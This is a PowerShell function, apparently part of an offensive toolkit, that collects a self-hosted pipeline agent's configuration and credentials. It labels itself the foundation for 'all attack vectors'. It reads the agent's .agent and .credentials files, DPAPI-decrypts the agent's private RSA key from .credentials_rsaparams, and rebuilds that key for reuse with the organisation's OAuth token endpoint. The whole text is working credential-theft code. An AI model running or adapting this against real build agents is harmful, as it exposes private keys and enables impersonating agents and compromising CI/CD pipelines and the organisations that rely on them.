# ── Agent Collector ──────────────────────────────────────────────
# Reads agent config, credentials, and RSA key.
# Common foundation for all attack vectors.
# ─────────────────────────────────────────────────────────────────
function Get-AgentInfo {
    param([string]$AgentPath)

    $agentFile     = Join-Path $AgentPath ".agent"
    $credFile      = Join-Path $AgentPath ".credentials"
    $rsaParamsFile = Join-Path $AgentPath ".credentials_rsaparams"

    foreach ($f in @($agentFile, $credFile, $rsaParamsFile)) {
        if (-not (Test-Path $f)) {
            Write-Log "File not found: $f" -Severity Fatal
        }
    }

    # ── .agent ──
    try {
        $agentConfig = Get-Content $agentFile | ConvertFrom-Json
    } catch {
        Write-Log "Failed to parse $agentFile : $($_.Exception.Message)" -Severity Fatal
    }

    $poolId    = $agentConfig.poolId
    $agentId   = $agentConfig.agentId
    $agentName = $agentConfig.agentName
    $serverUrl = $agentConfig.serverUrl

    if (-not $poolId -or -not $agentId -or -not $serverUrl) {
        Write-Log "Missing required fields in $agentFile (poolId/agentId/serverUrl)" -Severity Fatal
    }

    # Agent type detection
    $isDeploymentGroup = $false
    $agentType = "Self-Hosted Build Agent"
    if ($agentConfig.environmentId -and [int]$agentConfig.environmentId -gt 0) {
        $isDeploymentGroup = $true
        $agentType = "Environment Agent (envId=$($agentConfig.environmentId))"
    } elseif ($agentConfig.deploymentGroupId -and [int]$agentConfig.deploymentGroupId -gt 0) {
        $isDeploymentGroup = $true
        $agentType = "Deployment Group Agent (dgId=$($agentConfig.deploymentGroupId))"
    }

    # Agent version
    $agentVersionFile = Join-Path $AgentPath ".agentversion"
    if (Test-Path $agentVersionFile) {
        $agentVersion = ((Get-Content $agentVersionFile).Trim() -split '\+')[0]
    } else {
        $agentExe = Join-Path $AgentPath "bin\Agent.Listener.exe"
        if (Test-Path $agentExe) {
            $agentVersion = ((Get-Item $agentExe).VersionInfo.ProductVersion -split '\+')[0]
        } else {
            $agentVersion = "4.268.0"
        }
    }

    # OS
    $osRaw = [System.Runtime.InteropServices.RuntimeInformation]::OSDescription
    if ($osRaw -match "Windows\s*(\d+)") {
        $osDescription = "Windows $($matches[1])"
    } else {
        $osDescription = $osRaw
    }

    # ── .credentials ──
    try {
        $credentials = Get-Content $credFile | ConvertFrom-Json
        $clientId = $credentials.data.clientId
        $authUrl  = $credentials.data.authorizationUrl
    } catch {
        Write-Log "Failed to parse $credFile : $($_.Exception.Message)" -Severity Fatal
    }

    if (-not $clientId -or -not $authUrl) {
        Write-Log "Missing clientId or authorizationUrl in $credFile" -Severity Fatal
    }

    $orgUrl   = ($authUrl -split "/_apis")[0]
    $tokenUrl = "$orgUrl/_apis/oauth2/token"

    # ── .credentials_rsaparams (DPAPI decrypt) ──
    Add-Type -AssemblyName System.Security
    try {
        $encryptedBytes = [System.IO.File]::ReadAllBytes($rsaParamsFile)
        $decryptedBytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
            $encryptedBytes, $null,
            [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
        $rsaJson = [Text.Encoding]::UTF8.GetString($decryptedBytes)
        $rsaKey  = $rsaJson | ConvertFrom-Json
    } catch {
        Write-Log "Failed to decrypt RSA key: $($_.Exception.Message)" -Severity Error
        Write-Detail "You must run as the same user that installed the agent" "Yellow"
        exit 1
    }

    $rsaParams = New-Object System.Security.Cryptography.RSAParameters
    $rsaParams.Modulus  = [Convert]::FromBase64String($rsaKey.modulus)
    $rsaParams.Exponent = [Convert]::FromBase64String($rsaKey.exponent)
    $rsaParams.D        = [Convert]::FromBase64String($rsaKey.d)
    $rsaParams.P        = [Convert]::FromBase64String($rsaKey.p)
    $rsaParams.Q        = [Convert]::FromBase64String($rsaKey.q)
    $rsaParams.DP       = [Convert]::FromBase64String($rsaKey.dp)
    $rsaParams.DQ       = [Convert]::FromBase64String($rsaKey.dq)
    $rsaParams.InverseQ = [Convert]::FromBase64String($rsaKey.inverseQ)

    $rsa = [System.Security.Cryptography.RSA]::Create()
    $rsa.ImportParameters($rsaParams)

    # ── Print summary ──
    Write-Log "Agent Config" -Severity Success
    Write-Detail "Path:      $AgentPath"
    Write-Detail "Pool:      $poolId"
    Write-Detail "Agent:     $agentId ($agentName)"
    Write-Detail "Version:   $agentVersion"
    Write-Detail "Server:    $serverUrl"
    Write-Detail "OS:        $osDescription"
    $typeColor = if ($isDeploymentGroup) { "Yellow" } else { "White" }
    Write-Detail "Type:      $agentType" $typeColor
    Write-Host ""
    Write-Log "Credentials" -Severity Success
    Write-Detail "Client ID: $clientId"
    Write-Detail "Token URL: $tokenUrl"
    Write-Detail "RSA key:   loaded (DPAPI decrypted)"
    Write-Host ""

    return @{
        AgentPath         = $AgentPath
        PoolId            = $poolId
        AgentId           = $agentId
        AgentName         = $agentName
        ServerUrl         = $serverUrl
        Version           = $agentVersion
        OS                = $osDescription
        IsDeploymentGroup = $isDeploymentGroup
        AgentType         = $agentType
        RawConfig         = $agentConfig
        ClientId          = $clientId
        OrgUrl            = $orgUrl
        TokenUrl          = $tokenUrl
        Rsa               = $rsa
        RsaPublicModulus  = $rsaKey.modulus
        RsaPublicExponent = $rsaKey.exponent
    }
}
